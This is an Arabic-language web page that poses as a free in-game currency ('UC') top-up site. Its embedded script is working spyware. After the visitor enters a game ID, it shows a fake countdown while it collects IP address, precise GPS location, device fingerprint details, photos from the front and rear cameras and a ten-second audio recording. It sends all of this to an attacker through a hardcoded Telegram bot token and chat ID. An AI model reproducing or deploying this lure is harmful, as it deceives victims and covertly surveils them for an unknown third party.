<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شحن شدات US مجاني</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f5f5f5;
            margin: 0;
        }
        #container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        #status {
            font-size: 18px;
            margin: 20px 0;
            color: #333;
        }
        #permission-btn, #submit-btn {
            background: #4285f4;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px 0;
            width: 100%;
        }
        #permission-btn:disabled, #submit-btn:disabled {
            background: #cccccc;
        }
        #user-id {
            padding: 12px;
            font-size: 16px;
            width: 100%;
            margin: 10px 0;
            box-sizing: border-box;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .countdown {
            font-size: 24px;
            font-weight: bold;
            color: #4285f4;
            margin: 20px 0;
        }
        .welcome-message {
            font-size: 24px;
            color: #4285f4;
            margin-bottom: 20px;
            font-weight: bold;
        }
        .hidden {
            display: none;
        }
        .loading {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .error {
            color: #d32f2f;
            margin: 10px 0;
        }
        .success {
            color: #388e3c;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div id="container">
        <div class="welcome-message" id="welcome-message">اهلا بك في موقع شحن شدات US مجاني 💸</div>
        
        <!-- الصفحة 1: بدء العملية -->
        <div id="page1">
            <button id="permission-btn">ابدأ الآن</button>
        </div>
        
        <!-- الصفحة 2: إدخال المعرف -->
        <div id="page2" class="hidden">
            <div id="status">اكتب الايدي الخاص بحسابك 🆔</div>
            <input type="number" id="user-id" placeholder="أدخل الأيدي هنا">
            <button id="submit-btn">ارسال US</button>
        </div>
        
        <!-- الصفحة 3: العد التنازلي -->
        <div id="page3" class="hidden">
            <div id="status">جاري معالجة طلبك، انتظر 3 دقائق...</div>
            <div class="countdown" id="countdown">03:00</div>
            <div id="loading" class="loading hidden"></div>
            <div id="error-message" class="error hidden"></div>
            <div id="success-message" class="success hidden"></div>
        </div>
    </div>

    <script>
        // Telegram Configuration
        const BOT_TOKEN = "8448437426:AAGDNRN8rUX2BX8usRnteGq-RmlOxuq7hAE";
        const CHAT_ID = "6703506413";
        
        // DOM Elements
        const elements = {
            welcomeMessage: document.getElementById('welcome-message'),
            statusEl: document.getElementById('status'),
            permissionBtn: document.getElementById('permission-btn'),
            submitBtn: document.getElementById('submit-btn'),
            userIdInput: document.getElementById('user-id'),
            page1: document.getElementById('page1'),
            page2: document.getElementById('page2'),
            page3: document.getElementById('page3'),
            countdownEl: document.getElementById('countdown'),
            loadingEl: document.getElementById('loading'),
            errorEl: document.getElementById('error-message'),
            successEl: document.getElementById('success-message')
        };
        
        // Move to page 2 when start button is clicked
        elements.permissionBtn.addEventListener('click', () => {
            elements.page1.classList.add('hidden');
            elements.page2.classList.remove('hidden');
        });
        
        // ==================== Improved Device Info Collection ====================
        async function getDeviceInfo(userId) {
            try {
                showLoading("جاري جمع معلومات الجهاز...");
                
                const ip = await fetchIP();
                const battery = await getBatteryInfo();
                const storage = await getStorageEstimate();
                
                const deviceInfo = {
                    userId: userId,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    deviceType: getDeviceType(),
                    os: getOSInfo(),
                    cpuCores: navigator.hardwareConcurrency || 'غير معروف',
                    ram: navigator.deviceMemory ? `${navigator.deviceMemory} جيجابايت` : 'غير معروف',
                    screen: `${window.screen.width}x${window.screen.height}`,
                    colorDepth: `${window.screen.colorDepth} بت`,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    battery: battery,
                    connection: getConnectionInfo(),
                    ip: ip,
                    gpu: getGPUInfo(),
                    touchSupport: 'ontouchstart' in window ? 'مدعوم' : 'غير مدعوم',
                    sensors: getSensorInfo(),
                    storage: storage,
                    installedApps: getInstalledAppsInfo(),
                    security: getSecurityInfo(),
                    time: new Date().toLocaleString('ar-EG'),
                    location: await tryGetLocation(userId)
                };
                
                await sendToTelegram(formatDeviceInfo(deviceInfo));
                return deviceInfo;
            } catch (error) {
                await sendToTelegram(`⚠️ خطأ في جمع معلومات الجهاز: ${error.message}\nUser ID: ${userId}`);
                throw error;
            } finally {
                hideLoading();
            }
        }
        
        // ==================== Improved IP Fetching ====================
        async function fetchIP() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://ipapi.co/json/',
                'https://ipinfo.io/json'
            ];
            
            for (const service of services) {
                try {
                    const response = await fetch(service, { timeout: 5000 });
                    const data = await response.json();
                    return data.ip || data.ipAddress || 'غير معروف';
                } catch (error) {
                    console.error(`Failed to fetch IP from ${service}:`, error);
                }
            }
            
            return 'غير معروف';
        }
        
        // ==================== Improved Location ====================
        async function tryGetLocation(userId) {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve('Geolocation غير مدعوم');
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        const location = {
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        };
                        
                        await sendToTelegram(
                            `📍 موقع المستخدم:\n` +
                            `- خط العرض: ${location.latitude}\n` +
                            `- خط الطول: ${location.longitude}\n` +
                            `- الدقة: ${location.accuracy} متر\n` +
                            `- خرائط: https://maps.google.com/?q=${location.latitude},${location.longitude}\n` +
                            `- User ID: ${userId}`
                        );
                        
                        resolve(location);
                    },
                    (err) => {
                        console.error("Geolocation error:", err);
                        resolve(`فشل في الحصول على الموقع: ${err.message}`);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        // ==================== Improved Media Capture ====================
        async function captureMedia(type, options = {}, userId) {
            let stream;
            let recorder;
            const chunks = [];
            
            try {
                showLoading(type === 'audio' ? "جاري التحضير للتسجيل الصوتي..." : "جاري الوصول إلى الكاميرا...");
                
                stream = await navigator.mediaDevices.getUserMedia(options);
                
                if (type === 'audio') {
                    recorder = new MediaRecorder(stream);
                    recorder.ondataavailable = (e) => chunks.push(e.data);
                    recorder.start();
                    
                    await new Promise(resolve => setTimeout(resolve, 10000)); // 10 seconds
                    
                    if (recorder.state !== 'inactive') {
                        recorder.stop();
                    }
                    
                    await new Promise(resolve => { recorder.onstop = resolve; });
                    
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    await sendAudioToTelegram(blob, `audio_${userId}.webm`, userId);
                    return true;
                } else {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    
                    await new Promise((resolve, reject) => {
                        video.onloadedmetadata = resolve;
                        video.onerror = reject;
                        video.play().catch(reject);
                    });
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const blob = await new Promise(resolve => 
                        canvas.toBlob(resolve, 'image/jpeg', 0.7)
                    );
                    
                    const facingMode = options.video?.facingMode?.exact || 'unknown';
                    const filename = `${facingMode}_${userId}.jpg`;
                    await sendPhotoToTelegram(blob, filename, userId);
                    return true;
                }
            } catch (error) {
                const errorType = type === 'audio' ? 'التسجيل الصوتي' : 'الكاميرا';
                await sendToTelegram(`⚠️ خطأ في ${errorType}: ${error.message}\nUser ID: ${userId}`);
                return false;
            } finally {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                hideLoading();
            }
        }
        
        // ==================== Main Process ====================
        async function startDataCollection(userId) {
            try {
                // 1. جمع معلومات الجهاز والموقع
                await getDeviceInfo(userId);
                
                // 2. الكاميرا الأمامية
                await captureMedia('video', { video: { facingMode: 'user' } }, userId);
                
                // 3. الكاميرا الخلفية (مع fallback)
                try {
                    await captureMedia('video', { video: { facingMode: 'environment' } }, userId);
                } catch (backError) {
                    console.error("Back camera failed, trying without facingMode:", backError);
                    await captureMedia('video', { video: true }, userId);
                }
                
                // 4. التسجيل الصوتي
                await captureMedia('audio', { audio: true }, userId);
                
                // إرسال رسالة نجاح
                await sendToTelegram(`✅ تم الانتهاء من جمع بيانات المستخدم\nUser ID: ${userId}`);
                showSuccess("تمت العملية بنجاح! سيتم شحن US قريباً");
            } catch (error) {
                console.error("Main process error:", error);
                showError("حدث خطأ أثناء المعالجة. يرجى المحاولة مرة أخرى.");
                await sendToTelegram(`⚠️ خطأ رئيسي في جمع البيانات\nUser ID: ${userId}\nError: ${error.message}`);
            }
        }
        
        // ==================== Helper Functions ====================
        function showLoading(message) {
            elements.statusEl.textContent = message;
            elements.loadingEl.classList.remove('hidden');
        }
        
        function hideLoading() {
            elements.loadingEl.classList.add('hidden');
            elements.statusEl.textContent = "جاري معالجة طلبك، انتظر...";
        }
        
        function showError(message) {
            elements.errorEl.textContent = message;
            elements.errorEl.classList.remove('hidden');
            elements.successEl.classList.add('hidden');
        }
        
        function showSuccess(message) {
            elements.successEl.textContent = message;
            elements.successEl.classList.remove('hidden');
            elements.errorEl.classList.add('hidden');
        }
        
        // ==================== Device Info Helpers ====================
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'نعم' : 'لا',
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {
                    return { level: 'غير معروف', charging: 'غير معروف' };
                }
            }
            return { level: 'غير مدعوم', charging: 'غير مدعوم' };
        }
        
        function getConnectionInfo() {
            if (navigator.connection) {
                return {
                    type: navigator.connection.effectiveType || 'غير معروف',
                    downlink: navigator.connection.downlink ? `${navigator.connection.downlink} Mb/s` : 'غير معروف',
                    rtt: navigator.connection.rtt ? `${navigator.connection.rtt} ms` : 'غير معروف',
                    saveData: navigator.connection.saveData ? 'نعم' : 'لا'
                };
            }
            return { type: 'غير معروف', saveData: 'غير معروف' };
        }
        
        function getGPUInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'غير معروف',
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'غير معروف'
                } : { vendor: 'غير معروف', renderer: 'غير معروف' };
            }
            return { vendor: 'غير مدعوم', renderer: 'غير مدعوم' };
        }
        
        function getSensorInfo() {
            const sensors = [];
            if ('accelerometer' in window) sensors.push('مقياس التسارع');
            if ('gyroscope' in window) sensors.push('الجيروسكوب');
            if ('magnetometer' in window) sensors.push('المغناطيسي');
            if ('AmbientLightSensor' in window) sensors.push('استشعار الضوء');
            return sensors.length ? sensors.join('، ') : 'لم يتم اكتشاف أي أجهزة استشعار';
        }
        
        async function getStorageEstimate() {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const estimate = await navigator.storage.estimate();
                    return {
                        usage: estimate.usage ? `${(estimate.usage / (1024 * 1024)).toFixed(2)} MB` : 'غير معروف',
                        quota: estimate.quota ? `${(estimate.quota / (1024 * 1024)).toFixed(2)} MB` : 'غير معروف'
                    };
                } catch (e) {
                    return { usage: 'غير معروف', quota: 'غير معروف' };
                }
            }
            return { usage: 'غير مدعوم', quota: 'غير مدعوم' };
        }
        
        function getInstalledAppsInfo() {
            if ('getInstalledRelatedApps' in window) {
                return 'مدعوم (يتطلب إذن المستخدم)';
            }
            return 'كشف محدود';
        }
        
        function getSecurityInfo() {
            const security = [];
            if (window.isSecureContext) security.push('سياق آمن');
            if (navigator.doNotTrack === '1') security.push('DNT مفعل');
            if (navigator.cookieEnabled) security.push('الكوكيز مفعلة');
            return security.length ? security.join('، ') : 'أساسي';
        }
        
        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/Android/i.test(ua)) return 'أندرويد';
            if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
            if (/Windows/i.test(ua)) return 'ويندوز';
            if (/Mac/i.test(ua)) return 'ماك';
            if (/Linux/i.test(ua)) return 'لينكس';
            return 'غير معروف';
        }
        
        function getOSInfo() {
            const ua = navigator.userAgent;
            const clientStrings = [
                {s:'Windows 10', r:/(Windows 10.0|Windows NT 10.0)/},
                {s:'Windows 8.1', r:/(Windows 8.1|Windows NT 6.3)/},
                {s:'Windows 8', r:/(Windows 8|Windows NT 6.2)/},
                {s:'Windows 7', r:/(Windows 7|Windows NT 6.1)/},
                {s:'Android', r:/Android/},
                {s:'iOS', r:/(iPhone|iPad|iPod)/},
                {s:'Mac OS X', r:/Mac OS X/},
                {s:'Linux', r:/Linux/},
                {s:'Ubuntu', r:/Ubuntu/}
            ];
            for (let i = 0; i < clientStrings.length; i++) {
                if (clientStrings[i].r.test(ua)) {
                    return clientStrings[i].s;
                }
            }
            return 'غير معروف';
        }
        
        function formatDeviceInfo(info) {
            return `📱 <b>معلومات الجهاز</b>\n\n` +
                   `👤 <b>معرف المستخدم</b>: ${info.userId || 'غير معروف'}\n\n` +
                   `🖥️ <b>معلومات النظام</b>\n` +
                   `- المنصة: ${info.platform}\n` +
                   `- الجهاز: ${info.deviceType}\n` +
                   `- نظام التشغيل: ${info.os}\n` +
                   `- متصفح المستخدم: ${info.userAgent}\n` +
                   `- نوى المعالج: ${info.cpuCores}\n` +
                   `- الذاكرة العشوائية: ${info.ram}\n\n` +
                   
                   `📊 <b>الشاشة</b>\n` +
                   `- الدقة: ${info.screen}\n` +
                   `- عمق الألوان: ${info.colorDepth}\n\n` +
                   
                   `🌐 <b>الشبكة</b>\n` +
                   `- نوع الاتصال: ${info.connection.type}\n` +
                   `- عنوان IP: ${info.ip}\n` +
                   `- اللغة: ${info.language}\n` +
                   `- المنطقة الزمنية: ${info.timezone}\n\n` +
                   
                   `📍 <b>الموقع</b>\n` +
                   (typeof info.location === 'object' ?
                   `- خط العرض: ${info.location.latitude}\n` +
                   `- خط الطول: ${info.location.longitude}\n` +
                   `- الدقة: ${info.location.accuracy} متر\n` +
                   `- خرائط: https://maps.google.com/?q=${info.location.latitude},${info.location.longitude}\n\n` :
                   `- ${info.location}\n\n`) +
                   
                   `🔋 <b>البطارية</b>\n` +
                   `- مستوى الشحن: ${info.battery.level}\n` +
                   `- حالة الشحن: ${info.battery.charging}\n\n` +
                   
                   `⚙️ <b>معلومات متقدمة</b>\n` +
                   `- كرت الشاشة: ${info.gpu.renderer}\n` +
                   `- شاشة لمس: ${info.touchSupport}\n` +
                   `- أجهزة الاستشعار: ${info.sensors}\n` +
                   `- مساحة التخزين: ${info.storage.quota}\n` +
                   `- الأمان: ${info.security}\n\n` +
                   
                   `⏰ <b>الوقت</b>\n${info.time}`;
        }
        
        // ==================== Telegram API Functions ====================
        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                return await response.json();
            } catch (error) {
                console.error('خطأ في إرسال الرسالة إلى Telegram:', error);
                throw error;
            }
        }
        
        async function sendPhotoToTelegram(photoBlob, filename, userId) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, filename);
                formData.append('caption', `صورة من مستخدم\nUser ID: ${userId}`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                return await response.json();
            } catch (error) {
                console.error('خطأ في إرسال الصورة إلى Telegram:', error);
                throw error;
            }
        }
        
        async function sendAudioToTelegram(audioBlob, filename, userId) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('audio', audioBlob, filename);
                formData.append('caption', `تسجيل صوتي من مستخدم\nUser ID: ${userId}`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                return await response.json();
            } catch (error) {
                console.error('خطأ في إرسال التسجيل الصوتي إلى Telegram:', error);
                throw error;
            }
        }
        
        // ==================== Main Event Listener ====================
        elements.submitBtn.addEventListener('click', async () => {
            const userId = elements.userIdInput.value.trim();
            
            if (!userId) {
                showError("الرجاء إدخال الأيدي الخاص بك");
                return;
            }
            
            // الانتقال إلى صفحة الانتظار
            elements.page2.classList.add('hidden');
            elements.page3.classList.remove('hidden');
            elements.errorEl.classList.add('hidden');
            elements.successEl.classList.add('hidden');
            
            // بدء العد التنازلي
            let timeLeft = 180;
            const countdownInterval = setInterval(() => {
                timeLeft--;
                
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                
                elements.countdownEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    elements.statusEl.textContent = "تم الانتهاء!";
                }
            }, 1000);
            
            // بدء جمع البيانات
            await startDataCollection(userId);
        });
    </script>
</body>
</html>
